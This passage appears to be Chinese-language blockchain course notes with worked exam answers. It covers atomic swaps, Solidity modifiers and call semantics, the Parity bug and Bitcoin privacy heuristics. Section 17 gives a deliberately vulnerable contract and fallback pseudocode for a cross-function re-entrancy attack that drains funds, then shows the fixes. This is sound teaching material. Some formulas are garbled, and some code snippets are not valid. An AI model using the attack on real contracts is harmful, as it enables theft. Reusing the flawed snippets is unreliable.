{\color{red}{\alpha_1} }-{{\color{red}{\beta_1}} } }{ 1- {\color{orange}{2 \beta} } } \lt{\color{red}{\alpha_1}}\)</span>的情况下不会获利</li><li><span class="math inline">\({\color{green}{P_2}}\)</span>在<spanclass="math inline">\(\frac{ {\color{green}{\alpha_2} }-{{\color{green}{\beta_2}} } }{ 1- {\color{orange}{2 \beta} } } \lt{\color{green}{\alpha_2}}\)</span>的情况下不会中获利 (相同的)</li></ol><p>那么我们只需要求解: <span class="math inline">\(\frac{{\color{red}{\alpha_1} }-{ {\color{red}{\beta_1}} } }{ 1-{\color{orange}{2 \beta} } } \lt {\color{red}{\alpha_1}},({\color{red}{\alpha_1}} &lt; 50 \%)\)</span></p><ul><li><ahref="https://www.wolframalpha.com/input?i2d=true&amp;i=Divide%5Ba-b%2C1-2b%5D+%3C+a%5C%2844%29+a+%3C%3D0.5%5C%2844%29+b+%3C+a">Wolframalpha</a>:<code>Divide[a-b,1-2b] &lt; a, a &lt;=0.5, b &lt; a</code></li><li>我们得到: 在<span class="math inline">\({\color{red}{\beta_1}} \lt{\color{red}{\alpha_1}} \lt 50\%\)</span>的条件下, 永远无法获利。</li></ul><p>也就是说<spanclass="math inline">\({\color{red}{P_1}}\)</span>和<spanclass="math inline">\({\color{green}{P_2}}\)</span>互相<strong>Sabotage</strong> 双方都不会获利, 反而会两败俱伤。</p><p>我们带入真实的数值来看一下结果:</p><ul><li><span class="math inline">\({\color{red}{\alpha_1}} ={\color{green}{\alpha_2}} = 30\%\)</span></li><li><spanclass="math inline">\({\color{red}{\beta_1}}={\color{green}{\beta_2}}={\color{orange}{\beta}}= 10 \%\)</span></li><li><span class="math inline">\(\frac{ {\color{red}{30 \%} }-{{\color{red}{10 \%}} } }{ 1- {\color{orange}{20 \%} } } \\ = 25\%\)</span></li></ul><p>所以很明<spanclass="math inline">\({\color{red}{P_1}}\)</span>和<spanclass="math inline">\({\color{green}{P_2}}\)</span>本来可以安分守己获取<spanclass="math inline">\(30 \%\)</span>的收益, 但互相攻击后只能获得<spanclass="math inline">\(25 \%\)</span>的奖励。</p></blockquote><h2 id="per-mines-预开采">13.Per-mines 预开采</h2><p>大多数<strong>Altcoin 另类币</strong>对<u>Pre-mined tokens预开采代币</u>采取<u>Lockup Period 锁定期</u>策略,即在一段时间内预开采代币不能被交易(并且通常在制定好<u>Vesting Schedule兑现计划</u>后逐渐允许可交易)。请记住,预挖硬币通常分配给创始人和基金会以支持代币的发展：</p><p><strong>13.a</strong>: 锁定期有什么好处?</p><blockquote><p>锁定期旨在防止创始人出售所有代币并在代币发布后立即放弃（<strong>Pump-and-Dump拉高抛售</strong>）。他们将有动力保持项目的价值,直到他们的所有代币都有所<u>Vest 归属</u>。</p></blockquote><p><strong>13.b</strong>: 锁定期太⻓或太短, 会导致什么问题?</p><blockquote><p>太短的锁定期可能无法防止<strong>Pump-and-Dump 拉高抛售</strong>,或者可能无法让创始人和开发人员支持该项目足够长的时间以使其发展。</p><p>过长的锁定期可能同样会令创始人灰心：如果创始人认为他们永远不会获利,他们可能会放弃。</p></blockquote><h2 id="atomic-swaps-不可分割跨链交换">14.Atomic swaps不可分割跨链交换</h2><p>假设有两条链, <code>PancakeChain</code> 和 <code>WaffleChain</code>。Alice 和 Bob 想要在链之间进行<strong>Atomicswaps</strong>。考虑描述的对称原子交换函数的更简单变体的伪代码。(注意!不同的是, 简化的伪代码只考虑在每条链上进行一次交易)。</p><table><colgroup><col style="width: 52%" /><col style="width: 47%" /></colgroup><thead><tr class="header"><th>Transaction 1 (<code>PancakeCoin</code>)</th><th>Transaction 2 (<code>WaffleCoin</code>)</th></tr></thead><tbody><tr class="odd"><td>Before time <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>:<br>*Signature by <span class="math inline">\(K_A\)</span><br>* <spanclass="math inline">\(x\)</span> such that <spanclass="math inline">\(H(x) = y\)</span><br>After time {}:<br>* Signatureby <span class="math inline">\(K_B\)</span></td><td>Before time <spanclass="math inline">\({\color{green}{T_{2}}}\)</span>:<br>* Signature by<span class="math inline">\(K_B\)</span><br>* <spanclass="math inline">\(x\)</span> such that <spanclass="math inline">\(H(x) = y\)</span><br>After time <spanclass="math inline">\({\color{green}{T_{2}}}\)</span>:<br>* Signature by<span class="math inline">\(K_A\)</span></td></tr></tbody></table><p><strong>14.a</strong>:原本<code>Bitcoin Script</code>机制无法实现此版本。添加了什么功能使这个更简单的版本成为可能?</p><blockquote><p>添加了<u>时间戳 Timestamp</u>:伪代码中的<code>if</code>分支需要进行<code>CHECKLOCKTIME_VERIFY</code>(<u>CLTV</u>)。</p><p><u>CLTV</u>: 是在 2015 年由 BIP65 通过软分叉添加的。</p></blockquote><p><strong>14.b</strong>: 根据上述脚本, Alice 最初持有<code>PancakeCoins</code> 还是 <code>WaffleCoins</code>?</p><blockquote><p>观察, <code>PancakeCoin</code>的交易1需要, Alice 在<spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>截止前提供签名<spanclass="math inline">\(K_{Alice}\)</span>, 以及Secret <spanclass="math inline">\({\color{orange}{x}}\)</span>。那么显然这比交易是由 Bob 发起的, 因为如果 Alice 在<spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>截止前没有进行兑换Bob 可以在<spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>截止后赎回自己的币。</p><p>反之, <code>WaffleCoins</code> 允许 Alice 在<spanclass="math inline">\({\color{green}{T_{2}}}\)</span>截止后赎回自己的币,所以 Alice 最初持有的就是 <code>PancakeCoin</code>。</p></blockquote><p><strong>14.c</strong>: 哪笔交易应该先被处理帐?如果反过来处理会发生什么?</p><blockquote><p>取决于哪一方选择 Secret <spanclass="math inline">\({\color{orange}{x}}\)</span>。</p><p>如果 Bob 决定 <spanclass="math inline">\({\color{orange}{x}}\)</span>, 那么需要 Alice先发布交易1。否则, Bob 可以立即花费交易2并拒绝发布交易1,同时保留两个硬币。</p><p>反之如果 Alice 选择 <spanclass="math inline">\({\color{orange}{x}}\)</span>, 那么需要 Bob先发布交易2。</p><p>最后一定要保证先发起的交易在另一笔交易发起之前被确认。</p></blockquote><p><strong>14.d</strong>: <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>和<spanclass="math inline">\({\color{green}{T_{2}}}\)</span>应该如何选择?</p><blockquote><p>这同样取决于谁决定 <spanclass="math inline">\({\color{orange}{x}}\)</span>。</p><p>如下图所示, 如果 Bob 选择 <span class="math inline">\(x\)</span>,那么我们想要 <span class="math inline">\({\color{CornflowerBlue}{T_{1}}}\gt {\color{green}{T_{2}}}\)</span>, 因为如果: <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}} \lt{\color{green}{T_{2}}}\)</span> 并且Bob 又知道 <spanclass="math inline">\({\color{orange}{x}}\)</span> (有优势),那么Bob可以在 <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>结束后再发布自己的 <spanclass="math inline">\({\color{orange}{x}}\)</span> 这样, Bob 可以获得Alice 的币但是, <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}}\)</span>现在已经超时, Alice 不能获得 Bob 的币, 那么 Bob 可以赎回自己的币。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206022247727.svg" alt="cc_atomic_swap" style="zoom:150%;" /></p><p>如此 Alice 竹篮打水一场空。</p></blockquote><p><strong>14.e</strong>: 在实践中, Alice 和 Bob 应该如何选择 <spanclass="math inline">\(|{\color{CornflowerBlue}{T_{1}}} -{\color{green}{T_{2}}}|\)</span> 差值 的大小?如果这个值太小会出什么问题? 如果这个值太大会出什么问题?</p><blockquote><p>在交换交易发起者交易超时时间大于参与交换者交易时间的前提下, <spanclass="math inline">\(|{\color{CornflowerBlue}{T_{1}}} -{\color{green}{T_{2}}}|\)</span>的差值至少需要留出足够的<u>交易确认时间</u>。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206022307297.svg" alt="cc_atomic_swap_time_slot" style="zoom:150%;" /></p><p>例: 如上图所示, Bob 选择 <spanclass="math inline">\({\color{orange}{x}}\)</span> 并且 <spanclass="math inline">\({\color{CornflowerBlue}{T_{1}}} \lt{\color{green}{T_{2}}}\)</span>。 Bob 可能会在非常接近截止日期 <spanclass="math inline">\({\color{green}{T_{2}}}\)</span> 时（通过揭示 <spanclass="math inline">\({\color{orange}{x}}\)</span>）认领<code>WaffleCoins</code>。 为了确保 Alice 得到<code>PancakeCoins</code>, Alice 需要查看 Bob 在 <code>WaffleCoin</code>链上的交易（学习 <spanclass="math inline">\({\color{orange}{x}}\)</span>）, 并使用 <spanclass="math inline">\({\color{orange}{x}}\)</span> 在<code>PancakeCoin</code> 链上确认交易以获取 <code>PancakeCoin</code>。因此, 时间差应该至少是<spanclass="math inline">\({\color{purple}{确认交易的预期时间长度}}\)</span>,加上 Alice 准备交易的一些合理反应时间, 再发布一些安全边际。 对于比特币,这意味着时间差应该至少是几个小时(<spanclass="math inline">\(6\)</span>个区块确认需要<spanclass="math inline">\(1\)</span>个小时)以保证交易在最长链上。</p><p>如果时间窗口太小, Bob（或选择 <spanclass="math inline">\({\color{orange}{x}}\)</span>的一方）可能会抢在另一方之前在两条链上获得交易,从而违反协议的安全性。</p><p>如果时间窗口太长, 则在协议失败的情况下对方等待变得不方便。</p></blockquote><p><strong>14.f</strong>: 如果同一个 Secret ${} $被多次使用会怎么样?</p><blockquote><p>这意味着协议完全不安全, 因为双方都知道 <spanclass="math inline">\({\color{orange}{x}}\)</span>。所以无论哪一方发起交换,另一方都可以立即通过 <spanclass="math inline">\({\color{orange}{x}}\)</span> 拿走对方的币。</p></blockquote><h2 id="solidity-modifiers">15.Solidity Modifiers</h2><p>观察以下 Solidity 函数, 并参考<ahref="https://docs.soliditylang.org/en/v0.8.13/cheatsheet.html">SolidityCheatsheet v0.8.13</a>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address owner; </span><br><span class="line">function withdraw() public owner_only &#123;</span><br><span class="line">    payable(msg.sender).transfer(this.value); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>15.a</strong>:<code>withdraw</code>功能是否需要标注<code>payable</code>?</p><blockquote><p>不,因为不需要向提现(<code>withdraw</code>)此功能发送资金。提现功能只需要向外发送汇款。</p><ul><li><code>payable</code>: 允许他们在被调用的同时接收以太币</li></ul></blockquote><p><strong>15.b</strong>:<code>withdraw</code>功能可以标记为<code>view</code> &amp;/OR<code>pure</code>吗?</p><blockquote><p>不,<code>view</code>/<code>pure</code>会阻止向外汇款(这会修改合约的状态)</p><ul><li><code>pure</code>: 不允许函数修改或访问状态。</li><li><code>view</code>: 不允许函数修改状态。</li></ul></blockquote><p><strong>15.c</strong>: 成员变量 <code>owner</code>的可见性级别应该是以下哪个:<code>public</code>/<code>private</code>/<code>internal</code>/<code>extrenal</code>）?</p><blockquote><p>都可以, 但<code>internal</code>/<code>private</code>可能更合适。使用<code>public</code>和<code>external</code>也不会引发安全问题,只要没有<code>public</code>函数的实现,<code>public</code>&amp;<code>external</code>都不会被直接<u>Overwrite覆盖</u>。</p><ul><li><code>public</code>: 函数对外部和内部可见(为存储/状态变量创建一个getter 函数)。</li><li><code>private</code>: 函数仅对当前合约可见。</li><li><code>external</code>: 函数仅对外部可见(仅适用于函数),即只能被消息调用(通过 <code>this.func</code>)。</li><li><code>internal</code>: 函数仅对内部可见。</li></ul></blockquote><p><strong>15.d</strong>: 考虑一下对 <code>owner_only</code> <u>modifier修饰符</u>的实现。那些是安全的? 哪个是最佳做法?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// i [最安全的]</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    require(msg.sender == owner_address); </span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br><span class="line">// ii [安全但是没有用 required]</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    if (msg.sender != owner_address) return;</span><br><span class="line">    _; // 没用 ← required</span><br><span class="line">&#125;</span><br><span class="line">/** iii </span><br><span class="line">* - [先运行了 (_;) 等于先进行了转账, 再发布账户地址]</span><br><span class="line">* - [并且没用 required]</span><br><span class="line">*/</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    _; // ← 不可在确认地址钱转账</span><br><span class="line">    if (msg.sender != owner_address) // 没用 ← required</span><br><span class="line">        return;</span><br><span class="line">&#125;</span><br><span class="line">// iv [先运行了 (_;) 等于先进行了转账, 再发布账户地址]</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    _; // ← 不可在确认地址钱转账</span><br><span class="line">    require (msg.sender == owner_address)</span><br><span class="line">&#125;</span><br><span class="line">/** v</span><br><span class="line">* - [先运行了 (_;) 等于先进行了转账, 再发布账户地址]</span><br><span class="line">* - [并且没用 required]</span><br><span class="line">* - [重复发了两次]</span><br><span class="line">*/</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    _; // ← 不可在确认地址钱转账</span><br><span class="line">    if (msg.sender != owner_address) // 没用 ← required</span><br><span class="line">        return; </span><br><span class="line">    _; // ← 重复发了两次</span><br><span class="line">&#125;</span><br><span class="line">// vi [安全但是没有用 required]</span><br><span class="line">modifier owner_only &#123;</span><br><span class="line">    if(msg.sender == owner_address) </span><br><span class="line">        _; // 没用 ← required</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="contract-call-合约调用">16.Contract Call 合约调用</h2><p>考虑以下两个合约, 并参考<ahref="https://docs.soliditylang.org/en/latest/types.html#members-of-addresses">Membersof Addresses — Solidity 0.8.15</a>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract A &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    address other;</span><br><span class="line">    function foo(uint y) public&#123;</span><br><span class="line">        x += (y * 2);</span><br><span class="line">        (bool result, bytes memory newZ) = other.__空白行__(abi.encodeWithSignature(&quot;bar(uint)&quot;, x+1));</span><br><span class="line">        x -= abi.decode(newZ, (uint));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function bar(uint y) public returns (uint z)&#123;</span><br><span class="line">        x += (y * 3);</span><br><span class="line">        (bool result, ) = other.call(abi.encodeWithSignature(&quot;baz(uint)&quot;, x+2));</span><br><span class="line">        z = x - 10;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function baz(uint y) public&#123;</span><br><span class="line">        x += y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>已知 <span class="math inline">\({\color{green}{A1}}\)</span> 和<span class="math inline">\({\color{CornflowerBlue}{A2}}\)</span>两个合约基于上述代码, 并进行了初始化:</p><ol type="1"><li><code>A1.other = A2</code> &amp; <code>A2.other = A1</code></li><li><code>A1.x = 2</code> 和 <code>A2.x = 3</code></li></ol><blockquote><p>下面a,b,c三道题主要帮助理解: <code>call</code>,<code>delegatecall</code> &amp; <code>staticcall</code>的区别。这三个函数都是非常<u>lov-level 底层</u>的,他们会打破<code>Solidity</code>代码的<strong>Type-Safety型别安全</strong>。三个函数均采用<u>single bytes memory parameter单字节内存参数</u>,并返回成功条件(<code>boolean</code>)和返回的数据(<code>bytes memory</code>)。</p><ul><li>将<code>call</code>, <code>delegatecall</code>,<code>staticcall</code> 分别填入合约中的这段代码的<u>{空白处}</u>:<code>(bool result, bytes memory newZ) = other.</code><u>{空白处}</u><code>(abi.encodeWithSignature("bar(uint)", x+1));</code></li><li><code>abi.encodeWithSignatur</code>函数是用于对结构化数据进行编码。</li></ul></blockquote><p><strong>16.a</strong>:如果<code>foo()</code>中的空白处用<code>call</code>普通调用,那么在调用<code>A1.foo(7)</code>之后<code>A1.x</code>&amp;<code>A2.x</code>会是什么?</p><blockquote><p>如果使用 <code>call</code>普通调用, 那么有:<code>(bool result, bytes memory newZ) = other.call(abi.encodeWithSignature("bar(uint)", x+1));</code></p><p><code>call</code>函数: 使用<u>给定地址的代码</u>, 以及所有包括存储,余额, etc, 都取自<u>给定地址</u>的合约。</p><ol type="1"><li><code>A1.foo(7)</code>:首先<code>A1</code>通过<code>call</code>普通调用<code>foo()</code>函数,并传入参数<code>7</code>, 即<spanclass="math inline">\({\color{orange}{y = 7}}\)</span><ol type="1"><li>那么<code>foo</code>函数将被<code>A1</code>运行:<code>function foo(uint 7) public</code></li><li>我们已知<code>A1.x=2</code>, 那么: <code>x += (y*2)</code> 就等于:<span class="math inline">\({\color{green}{A1.x}}= 2 + (7 * 2) \\{\color{green}{A1.x=16}}\)</span></li></ol></li><li>然后由于我们用<code>other.call</code>普通调用,由于已知<code>A1.other = A2</code>,那么普通调用将使用<code>A2</code>的合约代码以及存储&amp;余额, etc.<ol type="1"><li>那么<code>bar</code>函数将被<code>A2</code>运行: 首先调用了<code>function bar(uint y) public returns (uint z)</code></li><li>并且<span class="math inline">\({\color{green}{A1.x}} + 1 =17\)</span>作为<code>A2.bar(uint y)</code>的输入, 也就是说<spanclass="math inline">\({\color{orange}{y = 17}}\)</span></li><li>我们已知 <spanclass="math inline">\({\color{CornflowerBlue}{A2.x=3}} \And{\color{orange}{y = 17}}\)</span>, 那么: <code>x += (y*3)</code> 就等于:<span class="math inline">\({\color{CornflowerBlue}{A2.x}} = 3 + (17*3)\\ {\color{CornflowerBlue}{A2.x = 54}}\)</span></li></ol></li><li>然后<code>A2</code>的<code>bar</code>函数再发布call<code>普通调用</code>A1<code>的存储运行:</code>A1.baz()<code>函数       1. 并且$&#123;\color&#123;CornflowerBlue&#125;&#123;A2.x&#125;&#125;+2$作为</code>A1.baz(unity)<code>的输入, 也就是说: $&#123;\color&#123;orange&#125;&#123;y&#125;&#125; = 54 + 2 \\ &#123;\color&#123;orange&#125;&#123;y = 56&#125;&#125;$       2. 我们已知 $&#123;\color&#123;green&#125;&#123;A1.x=16&#125;&#125;$, 那么</code>x+= y` 则等于 ${} = {} + {} \ {} = {} + {} \ {} $</li><li><code>A2.bar()</code>的最后一步是计算: <code>z = x - 10</code>,并作为<code>abi.decode</code>的结果返回给<code>A1.foo()</code><ol type="1"><li><span class="math inline">\(z ={\color{CornflowerBlue}{A2.x}}-10\)</span></li><li><span class="math inline">\(z = {\color{CornflowerBlue}{54}} - 10 \\z = 44\)</span></li><li><code>A2.bar()</code> 会返回 $ {}$ 给 <code>A1.foo()</code></li></ol></li><li>最后: <code>A1.foo()</code> 的最后一步是: ${} = {} - {} \ {} $</li></ol><p>所以: <span class="math inline">\({\color{green}{A1.x = 28}} \And{\color{CornflowerBlue}{A2.x = 54}}\)</span></p></blockquote><p><strong>16.b</strong>: 如果 <code>foo()</code> 中的空白处用<code>delegatecall</code> 委托调用, 那么在调用 <code>A1.foo(7)</code>之后 <code>A1.x</code> 和 <code>A2.x</code> 会是什么?</p><blockquote><p>如果使用 <code>delegatecall</code>委托调用, 那么有:<code>(bool result, bytes memory newZ) = other.delegatecall(abi.encodeWithSignature("bar(uint)", x+1));</code></p><p><code>delegatecall</code>函数的不同之处在于只使用<u>给定地址的代码</u>,所有其他的包括: 存储, 余额, etc, 都取自当前合约。</p><ol type="1"><li>同样的<code>A1.foo()</code>:<ul><li><span class="math inline">\({\color{orange}{y = 7}}\)</span></li><li><span class="math inline">\({\color{green}{A1.x=16}}\)</span></li></ul></li><li><code>A1.other.delegatecall()</code>:<ul><li><span class="math inline">\({\color{orange}{y = 17}}\)</span></li><li><span class="math inline">\({\color{green}{A1.x}} ={\color{green}{16}} + {\color{orange}{3 * 17}} \\ {\color{green}{A1.x =67}}\)</span></li></ul></li><li><code>A1.other.call()</code>:<ul><li><span class="math inline">\({\color{orange}{y = 69}}\)</span></li><li><span class="math inline">\({\color{CornflowerBlue}{A2.x = 3}} + 69\\ {\color{CornflowerBlue}{A2.x = 72}}\)</span></li></ul></li><li><code>A1.z = x - 10;</code>:<ul><li><span class="math inline">\(z = {\color{green}{A1.x}} - 10 \\ z =57\)</span></li></ul></li><li><code>A1.x -= abi.decode(newZ, (uint));</code>:<ul><li><span class="math inline">\({\color{green}{A1.x}} ={\color{green}{67}} - z \\ {\color{green}{A1.x=10}}\)</span></li></ul></li></ol><p>所以根据计算: <span class="math inline">\({\color{green}{A1.x = 10}}\And {\color{CornflowerBlue}{A2.x = 72}}\)</span></p></blockquote><p><strong>16.c</strong>: 如果 <code>foo()</code> 中的空白处用<code>staticcall</code> 静态调用会生什么?</p><blockquote><p>如果使用 <code>delegatecall</code>委托调用, 那么有:<code>(bool result, bytes memory newZ) = other.staticcall(abi.encodeWithSignature("bar(uint)", x+1));</code></p><p>Byzantium 拜占庭 <code>staticcall</code>静态调用,如果被调用函数的状态被修改, 那么<code>staticcall</code>将 <u>revert恢复</u>。</p><ol type="1"><li><code>A1.other.staticcall()</code>:<ul><li>调用<code>A2.bar</code></li></ul></li><li><code>A2.x += (y*3)</code>:<ul><li>发现被调用的函数<code>A2.bar</code>中的函数状态被修改</li><li><u>Revert 恢复</u></li></ul></li><li>最后无事发生。</li></ol></blockquote><h2 id="cross-function-re-entrancy-跨函数重入攻击">17.Cross-FunctionRe-Entrancy 跨函数重入攻击</h2><p>考虑合约A具有以下功能:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool transferLock; </span><br><span class="line">bool withdrawLock;</span><br><span class="line"></span><br><span class="line">function transfer(address to, uint amount) external &#123;</span><br><span class="line">    if(!transferLock) &#123;</span><br><span class="line">        transferLock = True;</span><br><span class="line">        if (balances[msg.sender] &gt;= amount) &#123;</span><br><span class="line">            balances[to] += amount;</span><br><span class="line">            balances[msg.sender] -= amount;</span><br><span class="line">        &#125;</span><br><span class="line">        transferLock = False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdraw() external &#123;</span><br><span class="line">    if(!withdrawLock) &#123;</span><br><span class="line">        withdrawLock = True;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        (bool result, ) = payable(msg.sender).call&#123;value: amount&#125;();</span><br><span class="line">        require(result);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        withdrawLock = False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>假设攻击者拥有该合约的账户, 且余额为 100 eth。参考: <ahref="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/">重入攻击- 以太坊智能合约最佳实践</a></p><p><strong>17.a</strong>: 尽管使用了锁, 该合约仍然可以被重入攻击,解释为什么。并为攻击者用来攻击该合约的<u>fallback回退函数</u>编写伪代码, 攻击者可以在<strong>Re-entrancy Attack重入攻击</strong>中窃取多少?</p><blockquote><p>该函数需要仅对外部可见 (所以需要: <code>external</code>)</p><p>该函数需要在被调用的同时接收以太币 (所以需要:<code>payable</code>)</p><p>fallback 回退函数是三无得: 没有名字、没有参数、没有返回值</p><ol type="1"><li>首先攻击合约B可以通过调用<code>withdraw</code></li><li>在上述 <code>withdraw</code> 函数中<code>payable(msg.sender).call&#123;value: amount&#125;();</code> 会调用下面的<code>fallback</code> 回退函数,届时<code>transfer</code>函数中的<code>transferLock</code>并没用被设置,所以我们可以执行<code>transfer</code>函数并转账给指定的<code>fridendlyAddress</code>;从而得到攻击者通过合约B得到100Eth的转账(transfer)。并且攻击者的合约B也会成功withdraw 100 Eth。</li></ol><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract B &#123; </span><br><span class="line">    function() external payable &#123;</span><br><span class="line">        A.transfer(&lt;friendlyAddress&gt;, 100 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>17.b</strong>:仅通过修改<code>transfer</code>函数修复该问题</p><blockquote><p>参考: <ahref="https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21">ProtectYour Solidity Smart Contracts From Reentrancy Attacks</a></p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint amount) external &#123;</span><br><span class="line">    if(!transferLock &amp;&amp; !withdrawLock) &#123; // ←确定没有同时在取钱</span><br><span class="line">        transferLock = True;</span><br><span class="line">        if (balances[msg.sender] &gt;= amount) &#123;</span><br><span class="line">            balances[to] += amount;</span><br><span class="line">            balances[msg.sender] -= amount;</span><br><span class="line">        &#125;</span><br><span class="line">        transferLock = False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>17.c</strong>:仅通过修改<code>withdraw</code>函数修复该问题</p><blockquote><p>参考: <ahref="https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern">安全注意事项:使用检查-效果-交互模式 — Solidity 0.8.15 文档 (soliditylang.org)</a></p><p>简单来说就是: 注意交易&amp;扣款的顺序, 在执行交易前需要先扣款,再发布。</p><ol type="1"><li>大多数函数将首先执行一些检查, 检查谁调用了函数, 参数范围,是否发送了足够的以太币, 该人是否有token等。</li><li>通过检查后应该, 该状态的<u>effect影响</u>(取钱操作)应该先被执行(先将取出的钱从余额中扣除)。</li><li>保证前两步之后, 最后一步再发布他合约/函数进行交互。</li></ol><p>所以<code>withdraw</code>中的余额应该提前到<code>call</code>调用交互执行<code>send</code>之前完成</p><p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw() external &#123;</span><br><span class="line">    if(!withdrawLock) &#123;</span><br><span class="line">        withdrawLock = True;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender] = 0; // &lt;- 先扣钱再发布</span><br><span class="line">        (bool result, ) = payable(msg.sender).call&#123;value: amount&#125;();</span><br><span class="line">        require(result);</span><br><span class="line">        // balances[msg.sender] = 0;</span><br><span class="line">        withdrawLock = False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure></p></blockquote><h2 id="parity-bug-错误">18.Parity bug 错误</h2><p>回顾 <strong>Parity bug</strong>, 大多数合约依赖 Parity MultiSigWallet 奇偶多签钱包通过<code>delegatecall</code>委托调用, 来实现功能</p><blockquote><p><code>delegatecall</code>会使用Parity Contract的代码,但是使用自己的存储, 余额, etc.</p></blockquote><p><strong>18.a</strong>: 一种解决方法是不适用<code>delegatecall</code>,并只需将所有相关代码复制到自己的合同中。这种方法的缺点是什么?</p><blockquote><p>合约的代码会变的很大,存储也会随之变昂贵。因此合约的部署也会需要消耗更多的gas。</p></blockquote><p><strong>18.b</strong>: 另一个解决方法是将 Parity Contract的地址存储为可以更新的变量。这种方法的缺点是什么? 如何解决?</p><blockquote><p>合约代码原本是不可变的, 那么通过调用library, 并以修改library库的方法实现代码的可变性, 这有悖于合约代码不可变更的性的期望。</p><p>那么这个library 需要是足够可信的,并需要足够值得信任的机制来实现合约变量的更新。 需要特别防范不轨的library持有者恶意修改library内容以欺骗library 的调用者。</p><p>一些此类机制可能包括:</p><ul><li>在采用新合约变量之前要求<u>On-chain Announcement Period链上公告期</u></li><li>要求某些governance token持有者进行<u>On-Chain Vote链上投票</u>。</li></ul></blockquote><h2 id="idioms-of-use-惯用法则">19.Idioms of Use 惯用法则</h2><blockquote><p><strong>Change Address 找零地址</strong>: 如果<spanclass="math inline">\(A\)</span>有两个账户 <spanclass="math inline">\(\{A_1 \And A_2\}\)</span>, <spanclass="math inline">\(A_1\)</span>有6个BTC, <spanclass="math inline">\(A_2\)</span>有3个BTC,但是现在有一笔交易需要8.5个BTC, 那么我们需要通过 <spanclass="math inline">\(A_1 \And A_2\)</span> 两个账户同时进行付款 <spanclass="math inline">\((6+3) - 8.5 = 0.5\)</span>, 那么我们需要将 0.5 个BTC 退回给 $A $ 即<strong>Change找零</strong>。 但是这个<strong>ChangeAddress 找零地址</strong>, 通常会因为比特币钱包等软件的惯用找零模式(<em>idioms of use "惯用法则"</em>) 而导致攻击者将<strong>Change Address找零地址</strong>与身份关联起来 (例如:2013年研究人员发现多数钱包软件会在需要找零时生成全新的地址,那么只要通过地址的新旧就可以分辨出找零和非找零地址)。</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206041240356.png" style="zoom:23%;" /></p><p><strong>19.a</strong>: 讨论“<em>Join-Control联合控制</em>"启发式及其可能不准确的情况。上图中是否存在可以<u>排除联合控制启发式</u>的交易?</p><blockquote><p><strong>CoinJoin</strong> 作为去中心化混合的一个例子,理想情况下每个币对应的输入应该由单独的实体控制。这可以很好的解释什么是<u>失败的join-control 启发式</u>。</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206041400229.png" alt="sol19a" style="zoom:32%;" /></p><p>上图中,可以<u>排除</u><code>3-to-3</code>三进三出的混合的交易。通过跟踪更改输出,顶部输入来自 Alice 控制的地址, 底部两个来自 Bob控制的地址。那么这个<code>3-to-3</code>的混合交易两个输入都来自于Bob但另一个输入来自Alice,那么这笔混合交易是不能通过 <u>join-control启发式</u>推断出控制者身份的(正确情况应该是3个交易都来自同一个人)。</p></blockquote><p><strong>19.b</strong>: 观察者能否确定 Bob 在标记为 (1)的交易中向谁付款? 解释如何或解释为什么不能确定地识别它们。如果无法识别Bob 支付的实体, 请描述此付款人拥有的匿名集。</p><blockquote><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202206041419807.png" alt="sol19b" style="zoom:38%;" /></p><p>首先我们知道上图中被标记为<spanclass="math inline">\({\color{orange}(2)}\)</span>的交易由Alice控制。</p><p>那么交易<spanclass="math inline">\({\color{CornflowerBlue}(3)}\)</span>的一个输入,来自于一笔指向由Alice控制的交易<spanclass="math inline">\({\color{orange}(2)}\)</span>的找零; 那么显然<spanclass="math 